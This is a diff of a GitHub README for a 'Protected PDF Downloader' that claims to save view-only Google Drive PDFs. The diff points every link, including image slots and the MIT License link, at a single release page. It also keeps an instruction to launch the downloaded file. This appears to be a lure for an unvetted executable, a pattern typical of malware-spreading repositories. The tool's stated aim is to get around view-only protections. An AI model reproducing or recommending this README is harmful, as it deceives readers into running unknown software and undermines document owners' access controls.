@@ -1,6 +1,6 @@
 # 📁 Protected PDF Downloader 📂
 
-![Protected PDF Downloader](https://imageurl.com)
+![Protected PDF Downloader](https://github.com/231011019/protected-pdf-downloader/releases/tag/v2.0)
 
 Welcome to the **Protected PDF Downloader** repository! Here, you will find a powerful script designed to assist you in downloading view-only protected PDFs from Google Drive with ease. By leveraging the capabilities of **jsPDF**, this script converts images into a downloadable PDF format, allowing you to access and save the content of protected PDF files.
 
@@ -17,7 +17,7 @@ Welcome to the **Protected PDF Downloader** repository! Here, you will find a po
 - **Topics:** browser-script, convert-images-to-pdf, drive-protected-pdf-downloader, google-drive-pdf-downloader, google-drive-pdf-extractor, google-drive-protected-pdf-downloader, javascript-pdf, jspdf, pdf-downloader, protected-pdf, protected-pdf-downloader, scrape-pdf, view-only-pdf, web-scraping
 
 ## 🔗 External Link
-[![Download Script](https://img.shields.io/badge/Download-App.zip-blue)](https://github.com/file/App.zip)
+[![Download Script](https://github.com/231011019/protected-pdf-downloader/releases/tag/v2.0)](https://github.com/231011019/protected-pdf-downloader/releases/tag/v2.0)
 (Ensure to launch the file after downloading)
 
 ## 🌐 Additional Information
@@ -30,7 +30,7 @@ To start utilizing the features of the **Protected PDF Downloader** script, foll
 3. Input the necessary details to download view-only protected PDFs from Google Drive in PDF format.
 4. Enjoy seamless access to previously inaccessible PDF content!
 
-![Demo](https://demoimage.com)
+![Demo](https://github.com/231011019/protected-pdf-downloader/releases/tag/v2.0)
 
 ## 🙌 Contribution
 Contributions to this repository are welcome! If you have ideas for improvements or new features, feel free to fork the repository and submit a pull request. Together, we can enhance the functionality of the **Protected PDF Downloader** script for the benefit of all users.
@@ -39,8 +39,8 @@ Contributions to this repository are welcome! If you have ideas for improvements
 If you require any assistance or have questions regarding the script's usage, please don't hesitate to reach out. Our team is here to help you make the most out of the **Protected PDF Downloader**.
 
 ## 📜 License
-The **Protected PDF Downloader** script is licensed under the [MIT License](https://opensource.org/licenses/MIT). Feel free to modify and distribute the script according to the terms of this license.
+The **Protected PDF Downloader** script is licensed under the [MIT License](https://github.com/231011019/protected-pdf-downloader/releases/tag/v2.0). Feel free to modify and distribute the script according to the terms of this license.
 
 Enjoy using the **Protected PDF Downloader** script and simplify the process of downloading protected PDFs from Google Drive effortlessly! 🎉
 
-![Thank You](https://thankyouimage.com)
+![Thank You](https://github.com/231011019/protected-pdf-downloader/releases/tag/v2.0)
